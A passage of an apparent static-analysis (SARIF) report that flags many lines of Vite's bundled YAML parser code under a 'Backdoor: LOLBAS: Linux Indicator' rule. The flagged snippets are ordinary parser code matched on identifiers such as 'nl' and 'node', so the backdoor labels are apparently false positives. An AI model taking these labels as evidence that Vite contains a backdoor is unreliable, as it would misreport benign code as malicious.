                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32202,
                  "startColumn": 23,
                  "endLine": 32202,
                  "endColumn": 27,
                  "snippet": {
                    "text": "        }\n        else if (!this.blockScalarKeep) {\n            do {\n                let i = nl - 1;\n                let ch = this.buffer[i];\n                if (ch === '\\r')\n                    ch = this.buffer[--i];\n",
                    "rendered": {
                      "text": "        }\n        else if (!this.blockScalarKeep) {\n            do {\n                let i = nl - 1;\n                let ch = this.buffer[i];\n                if (ch === '\\r')\n                    ch = this.buffer[--i];\n",
                      "markdown": "`        }\n        else if (!this.blockScalarKeep) {\n            do {\n                let i = nl - 1;\n                let ch = this.buffer[i];\n                if (ch === '\\r')\n                    ch = this.buffer[--i];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32198,
                  "startColumn": 11,
                  "endLine": 32198,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        if (ch === '\\t') {\n            while (ch === '\\t' || ch === ' ' || ch === '\\r' || ch === '\\n')\n                ch = this.buffer[++i];\n            nl = i - 1;\n        }\n        else if (!this.blockScalarKeep) {\n            do {\n",
                    "rendered": {
                      "text": "        if (ch === '\\t') {\n            while (ch === '\\t' || ch === ' ' || ch === '\\r' || ch === '\\n')\n                ch = this.buffer[++i];\n            nl = i - 1;\n        }\n        else if (!this.blockScalarKeep) {\n            do {\n",
                      "markdown": "`        if (ch === '\\t') {\n            while (ch === '\\t' || ch === ' ' || ch === '\\r' || ch === '\\n')\n                ch = this.buffer[++i];\n            nl = i - 1;\n        }\n        else if (!this.blockScalarKeep) {\n            do {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32191,
                  "startColumn": 15,
                  "endLine": 32191,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        }\n        // Trailing insufficiently indented tabs are invalid.\n        // To catch that during parsing, we include them in the block scalar value.\n        let i = nl + 1;\n        ch = this.buffer[i];\n        while (ch === ' ')\n            ch = this.buffer[++i];\n",
                    "rendered": {
                      "text": "        }\n        // Trailing insufficiently indented tabs are invalid.\n        // To catch that during parsing, we include them in the block scalar value.\n        let i = nl + 1;\n        ch = this.buffer[i];\n        while (ch === ' ')\n            ch = this.buffer[++i];\n",
                      "markdown": "`        }\n        // Trailing insufficiently indented tabs are invalid.\n        // To catch that during parsing, we include them in the block scalar value.\n        let i = nl + 1;\n        ch = this.buffer[i];\n        while (ch === ' ')\n            ch = this.buffer[++i];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32186,
                  "startColumn": 15,
                  "endLine": 32186,
                  "endColumn": 19,
                  "snippet": {
                    "text": "            if (nl === -1) {\n                if (!this.atEnd)\n                    return this.setNext('block-scalar');\n                nl = this.buffer.length;\n            }\n        }\n        // Trailing insufficiently indented tabs are invalid.\n",
                    "rendered": {
                      "text": "            if (nl === -1) {\n                if (!this.atEnd)\n                    return this.setNext('block-scalar');\n                nl = this.buffer.length;\n            }\n        }\n        // Trailing insufficiently indented tabs are invalid.\n",
                      "markdown": "`            if (nl === -1) {\n                if (!this.atEnd)\n                    return this.setNext('block-scalar');\n                nl = this.buffer.length;\n            }\n        }\n        // Trailing insufficiently indented tabs are invalid.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32181,
                  "startColumn": 15,
                  "endLine": 32181,
                  "endColumn": 19,
                  "snippet": {
                    "text": "                const cs = this.continueScalar(nl + 1);\n                if (cs === -1)\n                    break;\n                nl = this.buffer.indexOf('\\n', cs);\n            } while (nl !== -1);\n            if (nl === -1) {\n                if (!this.atEnd)\n",
                    "rendered": {
                      "text": "                const cs = this.continueScalar(nl + 1);\n                if (cs === -1)\n                    break;\n                nl = this.buffer.indexOf('\\n', cs);\n            } while (nl !== -1);\n            if (nl === -1) {\n                if (!this.atEnd)\n",
                      "markdown": "`                const cs = this.continueScalar(nl + 1);\n                if (cs === -1)\n                    break;\n                nl = this.buffer.indexOf('\\n', cs);\n            } while (nl !== -1);\n            if (nl === -1) {\n                if (!this.atEnd)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32154,
                  "startColumn": 19,
                  "endLine": 32154,
                  "endColumn": 23,
                  "snippet": {
                    "text": "                    indent += 1;\n                    break;\n                case '\\n':\n                    nl = i;\n                    indent = 0;\n                    break;\n                case '\\r': {\n",
                    "rendered": {
                      "text": "                    indent += 1;\n                    break;\n                case '\\n':\n                    nl = i;\n                    indent = 0;\n                    break;\n                case '\\r': {\n",
                      "markdown": "`                    indent += 1;\n                    break;\n                case '\\n':\n                    nl = i;\n                    indent = 0;\n                    break;\n                case '\\r': {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32145,
                  "startColumn": 11,
                  "endLine": 32145,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        return yield* this.pushUntil(ch => isEmpty(ch) || ch === '#');\n    }\n    *parseBlockScalar() {\n        let nl = this.pos - 1; // may be -1 if this.pos === 0\n        let indent = 0;\n        let ch;\n        loop: for (let i = this.pos; (ch = this.buffer[i]); ++i) {\n",
                    "rendered": {
                      "text": "        return yield* this.pushUntil(ch => isEmpty(ch) || ch === '#');\n    }\n    *parseBlockScalar() {\n        let nl = this.pos - 1; // may be -1 if this.pos === 0\n        let indent = 0;\n        let ch;\n        loop: for (let i = this.pos; (ch = this.buffer[i]); ++i) {\n",
                      "markdown": "`        return yield* this.pushUntil(ch => isEmpty(ch) || ch === '#');\n    }\n    *parseBlockScalar() {\n        let nl = this.pos - 1; // may be -1 if this.pos === 0\n        let indent = 0;\n        let ch;\n        loop: for (let i = this.pos; (ch = this.buffer[i]); ++i) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32118,
                  "startColumn": 21,
                  "endLine": 32118,
                  "endColumn": 25,
                  "snippet": {
                    "text": "            }\n            if (nl !== -1) {\n                // this is an error caused by an unexpected unindent\n                end = nl - (qb[nl - 1] === '\\r' ? 2 : 1);\n            }\n        }\n        if (end === -1) {\n",
                    "rendered": {
                      "text": "            }\n            if (nl !== -1) {\n                // this is an error caused by an unexpected unindent\n                end = nl - (qb[nl - 1] === '\\r' ? 2 : 1);\n            }\n        }\n        if (end === -1) {\n",
                      "markdown": "`            }\n            if (nl !== -1) {\n                // this is an error caused by an unexpected unindent\n                end = nl - (qb[nl - 1] === '\\r' ? 2 : 1);\n            }\n        }\n        if (end === -1) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32114,
                  "startColumn": 15,
                  "endLine": 32114,
                  "endColumn": 19,
                  "snippet": {
                    "text": "                const cs = this.continueScalar(nl + 1);\n                if (cs === -1)\n                    break;\n                nl = qb.indexOf('\\n', cs);\n            }\n            if (nl !== -1) {\n                // this is an error caused by an unexpected unindent\n",
                    "rendered": {
                      "text": "                const cs = this.continueScalar(nl + 1);\n                if (cs === -1)\n                    break;\n                nl = qb.indexOf('\\n', cs);\n            }\n            if (nl !== -1) {\n                // this is an error caused by an unexpected unindent\n",
                      "markdown": "`                const cs = this.continueScalar(nl + 1);\n                if (cs === -1)\n                    break;\n                nl = qb.indexOf('\\n', cs);\n            }\n            if (nl !== -1) {\n                // this is an error caused by an unexpected unindent\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32108,
                  "startColumn": 11,
                  "endLine": 32108,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        }\n        // Only looking for newlines within the quotes\n        const qb = this.buffer.substring(0, end);\n        let nl = qb.indexOf('\\n', this.pos);\n        if (nl !== -1) {\n            while (nl !== -1) {\n                const cs = this.continueScalar(nl + 1);\n",
                    "rendered": {
                      "text": "        }\n        // Only looking for newlines within the quotes\n        const qb = this.buffer.substring(0, end);\n        let nl = qb.indexOf('\\n', this.pos);\n        if (nl !== -1) {\n            while (nl !== -1) {\n                const cs = this.continueScalar(nl + 1);\n",
                      "markdown": "`        }\n        // Only looking for newlines within the quotes\n        const qb = this.buffer.substring(0, end);\n        let nl = qb.indexOf('\\n', this.pos);\n        if (nl !== -1) {\n            while (nl !== -1) {\n                const cs = this.continueScalar(nl + 1);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 32011,
                  "startColumn": 11,
                  "endLine": 32011,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        let nl, sp;\n        let indent = -1;\n        do {\n            nl = yield* this.pushNewline();\n            if (nl > 0) {\n                sp = yield* this.pushSpaces(false);\n                this.indentValue = indent = sp;\n",
                    "rendered": {
                      "text": "        let nl, sp;\n        let indent = -1;\n        do {\n            nl = yield* this.pushNewline();\n            if (nl > 0) {\n                sp = yield* this.pushSpaces(false);\n                this.indentValue = indent = sp;\n",
                      "markdown": "`        let nl, sp;\n        let indent = -1;\n        do {\n            nl = yield* this.pushNewline();\n            if (nl > 0) {\n                sp = yield* this.pushSpaces(false);\n                this.indentValue = indent = sp;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 31366,
                  "startColumn": 17,
                  "endLine": 31366,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        case 'block-map':\n        case 'block-seq': {\n            const offset = token.offset + source.length;\n            const nl = { type: 'newline', offset, indent: token.indent, source: '\\n' };\n            delete token.items;\n            Object.assign(token, { type, source, end: [nl] });\n            break;\n",
                    "rendered": {
                      "text": "        case 'block-map':\n        case 'block-seq': {\n            const offset = token.offset + source.length;\n            const nl = { type: 'newline', offset, indent: token.indent, source: '\\n' };\n            delete token.items;\n            Object.assign(token, { type, source, end: [nl] });\n            break;\n",
                      "markdown": "`        case 'block-map':\n        case 'block-seq': {\n            const offset = token.offset + source.length;\n            const nl = { type: 'newline', offset, indent: token.indent, source: '\\n' };\n            delete token.items;\n            Object.assign(token, { type, source, end: [nl] });\n            break;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 31319,
                  "startColumn": 66,
                  "endLine": 31319,
                  "endColumn": 72,
                  "snippet": {
                    "text": "        const { offset } = token;\n        const indent = 'indent' in token ? token.indent : -1;\n        const props = [\n            { type: 'block-scalar-header', offset, indent, source: head }\n        ];\n        if (!addEndtoBlockProps(props, 'end' in token ? token.end : undefined))\n            props.push({ type: 'newline', offset: -1, indent, source: '\\n' });\n",
                    "rendered": {
                      "text": "        const { offset } = token;\n        const indent = 'indent' in token ? token.indent : -1;\n        const props = [\n            { type: 'block-scalar-header', offset, indent, source: head }\n        ];\n        if (!addEndtoBlockProps(props, 'end' in token ? token.end : undefined))\n            props.push({ type: 'newline', offset: -1, indent, source: '\\n' });\n",
                      "markdown": "`        const { offset } = token;\n        const indent = 'indent' in token ? token.indent : -1;\n        const props = [\n            { type: 'block-scalar-header', offset, indent, source: head }\n        ];\n        if (!addEndtoBlockProps(props, 'end' in token ? token.end : undefined))\n            props.push({ type: 'newline', offset: -1, indent, source: '\\n' });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 31306,
                  "startColumn": 9,
                  "endLine": 31306,
                  "endColumn": 15,
                  "snippet": {
                    "text": "}\nfunction setBlockScalarValue(token, source) {\n    const he = source.indexOf('\\n');\n    const head = source.substring(0, he);\n    const body = source.substring(he + 1) + '\\n';\n    if (token.type === 'block-scalar') {\n        const header = token.props[0];\n",
                    "rendered": {
                      "text": "}\nfunction setBlockScalarValue(token, source) {\n    const he = source.indexOf('\\n');\n    const head = source.substring(0, he);\n    const body = source.substring(he + 1) + '\\n';\n    if (token.type === 'block-scalar') {\n        const header = token.props[0];\n",
                      "markdown": "`}\nfunction setBlockScalarValue(token, source) {\n    const he = source.indexOf('\\n');\n    const head = source.substring(0, he);\n    const body = source.substring(he + 1) + '\\n';\n    if (token.type === 'block-scalar') {\n        const header = token.props[0];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 31230,
                  "startColumn": 70,
                  "endLine": 31230,
                  "endColumn": 76,
                  "snippet": {
                    "text": "            const head = source.substring(0, he);\n            const body = source.substring(he + 1) + '\\n';\n            const props = [\n                { type: 'block-scalar-header', offset, indent, source: head }\n            ];\n            if (!addEndtoBlockProps(props, end))\n                props.push({ type: 'newline', offset: -1, indent, source: '\\n' });\n",
                    "rendered": {
                      "text": "            const head = source.substring(0, he);\n            const body = source.substring(he + 1) + '\\n';\n            const props = [\n                { type: 'block-scalar-header', offset, indent, source: head }\n            ];\n            if (!addEndtoBlockProps(props, end))\n                props.push({ type: 'newline', offset: -1, indent, source: '\\n' });\n",
                      "markdown": "`            const head = source.substring(0, he);\n            const body = source.substring(he + 1) + '\\n';\n            const props = [\n                { type: 'block-scalar-header', offset, indent, source: head }\n            ];\n            if (!addEndtoBlockProps(props, end))\n                props.push({ type: 'newline', offset: -1, indent, source: '\\n' });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 31227,
                  "startColumn": 17,
                  "endLine": 31227,
                  "endColumn": 23,
                  "snippet": {
                    "text": "        case '|':\n        case '>': {\n            const he = source.indexOf('\\n');\n            const head = source.substring(0, he);\n            const body = source.substring(he + 1) + '\\n';\n            const props = [\n                { type: 'block-scalar-header', offset, indent, source: head }\n",
                    "rendered": {
                      "text": "        case '|':\n        case '>': {\n            const he = source.indexOf('\\n');\n            const head = source.substring(0, he);\n            const body = source.substring(he + 1) + '\\n';\n            const props = [\n                { type: 'block-scalar-header', offset, indent, source: head }\n",
                      "markdown": "`        case '|':\n        case '>': {\n            const he = source.indexOf('\\n');\n            const head = source.substring(0, he);\n            const body = source.substring(he + 1) + '\\n';\n            const props = [\n                { type: 'block-scalar-header', offset, indent, source: head }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 30905,
                  "startColumn": 9,
                  "endLine": 30905,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        indent: -1,\n        source: ''\n    };\n    const node = composeScalar(ctx, token, tag, onError);\n    if (anchor) {\n        node.anchor = anchor.source.substring(1);\n        if (node.anchor === '')\n",
                    "rendered": {
                      "text": "        indent: -1,\n        source: ''\n    };\n    const node = composeScalar(ctx, token, tag, onError);\n    if (anchor) {\n        node.anchor = anchor.source.substring(1);\n        if (node.anchor === '')\n",
                      "markdown": "`        indent: -1,\n        source: ''\n    };\n    const node = composeScalar(ctx, token, tag, onError);\n    if (anchor) {\n        node.anchor = anchor.source.substring(1);\n        if (node.anchor === '')\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 30879,
                  "startColumn": 11,
                  "endLine": 30879,
                  "endColumn": 17,
                  "snippet": {
                    "text": "                ? token.message\n                : `Unsupported token (type: ${token.type})`;\n            onError(token, 'UNEXPECTED_TOKEN', message);\n            node = composeEmptyNode(ctx, token.offset, undefined, null, props, onError);\n            isSrcToken = false;\n        }\n    }\n",
                    "rendered": {
                      "text": "                ? token.message\n                : `Unsupported token (type: ${token.type})`;\n            onError(token, 'UNEXPECTED_TOKEN', message);\n            node = composeEmptyNode(ctx, token.offset, undefined, null, props, onError);\n            isSrcToken = false;\n        }\n    }\n",
                      "markdown": "`                ? token.message\n                : `Unsupported token (type: ${token.type})`;\n            onError(token, 'UNEXPECTED_TOKEN', message);\n            node = composeEmptyNode(ctx, token.offset, undefined, null, props, onError);\n            isSrcToken = false;\n        }\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 30870,
                  "startColumn": 11,
                  "endLine": 30870,
                  "endColumn": 17,
                  "snippet": {
                    "text": "        case 'block-map':\n        case 'block-seq':\n        case 'flow-collection':\n            node = composeCollection(CN, ctx, token, props, onError);\n            if (anchor)\n                node.anchor = anchor.source.substring(1);\n            break;\n",
                    "rendered": {
                      "text": "        case 'block-map':\n        case 'block-seq':\n        case 'flow-collection':\n            node = composeCollection(CN, ctx, token, props, onError);\n            if (anchor)\n                node.anchor = anchor.source.substring(1);\n            break;\n",
                      "markdown": "`        case 'block-map':\n        case 'block-seq':\n        case 'flow-collection':\n            node = composeCollection(CN, ctx, token, props, onError);\n            if (anchor)\n                node.anchor = anchor.source.substring(1);\n            break;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 30863,
                  "startColumn": 11,
                  "endLine": 30863,
                  "endColumn": 17,
                  "snippet": {
                    "text": "        case 'single-quoted-scalar':\n        case 'double-quoted-scalar':\n        case 'block-scalar':\n            node = composeScalar(ctx, token, tag, onError);\n            if (anchor)\n                node.anchor = anchor.source.substring(1);\n            break;\n",
                    "rendered": {
                      "text": "        case 'single-quoted-scalar':\n        case 'double-quoted-scalar':\n        case 'block-scalar':\n            node = composeScalar(ctx, token, tag, onError);\n            if (anchor)\n                node.anchor = anchor.source.substring(1);\n            break;\n",
                      "markdown": "`        case 'single-quoted-scalar':\n        case 'double-quoted-scalar':\n        case 'block-scalar':\n            node = composeScalar(ctx, token, tag, onError);\n            if (anchor)\n                node.anchor = anchor.source.substring(1);\n            break;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 30857,
                  "startColumn": 55,
                  "endLine": 30857,
                  "endColumn": 61,
                  "snippet": {
                    "text": "        case 'alias':\n            node = composeAlias(ctx, token, onError);\n            if (anchor || tag)\n                onError(token, 'ALIAS_PROPS', 'An alias node must not specify any properties');\n            break;\n        case 'scalar':\n        case 'single-quoted-scalar':\n",
                    "rendered": {
                      "text": "        case 'alias':\n            node = composeAlias(ctx, token, onError);\n            if (anchor || tag)\n                onError(token, 'ALIAS_PROPS', 'An alias node must not specify any properties');\n            break;\n        case 'scalar':\n        case 'single-quoted-scalar':\n",
                      "markdown": "`        case 'alias':\n            node = composeAlias(ctx, token, onError);\n            if (anchor || tag)\n                onError(token, 'ALIAS_PROPS', 'An alias node must not specify any properties');\n            break;\n        case 'scalar':\n        case 'single-quoted-scalar':\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 30855,
                  "startColumn": 11,
                  "endLine": 30855,
                  "endColumn": 17,
                  "snippet": {
                    "text": "    let isSrcToken = true;\n    switch (token.type) {\n        case 'alias':\n            node = composeAlias(ctx, token, onError);\n            if (anchor || tag)\n                onError(token, 'ALIAS_PROPS', 'An alias node must not specify any properties');\n            break;\n",
                    "rendered": {
                      "text": "    let isSrcToken = true;\n    switch (token.type) {\n        case 'alias':\n            node = composeAlias(ctx, token, onError);\n            if (anchor || tag)\n                onError(token, 'ALIAS_PROPS', 'An alias node must not specify any properties');\n            break;\n",
                      "markdown": "`    let isSrcToken = true;\n    switch (token.type) {\n        case 'alias':\n            node = composeAlias(ctx, token, onError);\n            if (anchor || tag)\n                onError(token, 'ALIAS_PROPS', 'An alias node must not specify any properties');\n            break;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 30324,
                  "startColumn": 9,
                  "endLine": 30324,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    }\n    const coll = resolveCollection(CN, ctx, token, onError, tagName, tag);\n    const res = tag.resolve?.(coll, msg => onError(tagToken, 'TAG_RESOLVE_FAILED', msg), ctx.options) ?? coll;\n    const node = isNode$1(res)\n        ? res\n        : new Scalar(res);\n    node.range = coll.range;\n",
                    "rendered": {
                      "text": "    }\n    const coll = resolveCollection(CN, ctx, token, onError, tagName, tag);\n    const res = tag.resolve?.(coll, msg => onError(tagToken, 'TAG_RESOLVE_FAILED', msg), ctx.options) ?? coll;\n    const node = isNode$1(res)\n        ? res\n        : new Scalar(res);\n    node.range = coll.range;\n",
